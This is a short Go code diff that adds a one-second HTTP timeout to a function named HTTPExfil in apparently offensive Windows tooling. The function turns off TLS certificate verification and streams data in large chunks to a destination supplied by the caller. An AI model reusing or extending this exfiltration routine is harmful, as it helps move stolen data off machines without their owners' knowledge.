@@ -12,6 +12,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -268,6 +269,7 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 		var tmp [4 * 1024 * 1024]byte
 
 		http.DefaultClient.TLSClientConfig.InsecureSkipVerify = true
+		http.DefaultClient.Timeout = time.Second
 
 		for {
 			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
